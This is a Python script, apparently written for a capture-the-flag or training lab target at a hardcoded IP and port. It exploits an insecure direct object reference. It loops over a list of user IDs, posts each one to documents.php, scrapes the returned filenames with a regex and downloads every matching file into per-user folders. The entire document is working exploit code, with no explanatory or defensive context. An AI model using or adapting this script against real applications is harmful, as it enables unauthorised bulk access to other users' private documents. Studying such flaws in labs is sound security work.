import requests
import os
import re
from typing import List

base_url = "http://94.237.60.55:37634"
url = "http://94.237.60.55:37634/documents.php"
valid_id_list = "valid_nums.txt"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": f"{base_url}/documents.php"
}


def scrape_doc_names(data : str):
    filenames = re.findall(r"/documents/([^\"']+)", data)
    if filenames:
        return filenames

def request_valid_codes(id : str):
    data = {"uid": id}
    response = requests.post(url, data=data)
    return response.text

def download_valid_docs(filenames, id: str):
    if len(filenames) > 0:
        os.makedirs(f"docs/{id}", exist_ok=True)
    else:
        return -1
    for filename in filenames:
        file_url = f"{base_url}/documents/{filename}"
        save_path = f"docs/{id}/{filename}"
        response= requests.get(file_url, headers=headers)
        if response.status_code == 200:
            with open(save_path, "wb") as file:
                file.write(response.content)
            print(f"[+] Saved: {save_path}")
        else:
            print(f"[-] Failed to download {filename} (Status: {response.status_code})")

def main():
    os.makedirs("docs", exist_ok=True)
    valid_ids = []
    with open(valid_id_list, "r") as file:
        valid_ids = file.readlines()
    for id in valid_ids:
        id = id.strip()
        valid_docs = scrape_doc_names(request_valid_codes(id))
        download_valid_docs(valid_docs, id)

if __name__ == "__main__":
    main()
